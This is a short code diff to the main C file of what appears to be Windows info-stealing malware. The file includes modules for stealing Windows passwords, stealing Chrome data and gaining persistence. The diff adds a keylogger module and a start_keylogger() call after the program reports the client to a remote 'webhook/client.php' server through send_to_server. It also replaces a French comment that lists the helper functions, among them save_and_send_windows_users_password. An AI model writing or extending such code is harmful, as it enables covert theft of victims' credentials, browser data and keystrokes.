@@ -7,24 +7,10 @@
 #include "windows_users_passwords.c"
 #include "chrome_data.c"
 #include "persistance.c"
+#include "keylogger.c"
 
 #include "../include/http.h"
-
-// structure COMPUTER_INFOS
-#include "../include/structures.h"
-
-/*
-LISTE FONCTIONS EXTERNES UTILES A CE FICHIER
-
-src/http.c:
-    -send_to_server(char* route, char* data)
-
-src/computer_informations.c:
-    -get_computer_info(char * computer_name, char * username, char * arch)
-
-src/windows_users_passwords:
-    -save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info)
-*/
+#include "../include/structures.h" //structure COMPUTER_INFOS
 
 int is_first_execution(char *current_executable_path, char *softwareDataDirectory, char *fake_executable_name)
 {
@@ -74,6 +60,8 @@ int main(void)
     printf("Architecture: %s\n\n", computer.architecture);
 
     send_to_server("webhook/client.php", "{\"client_id\":1}");
+
+    start_keylogger();
 
     return 0;
 }
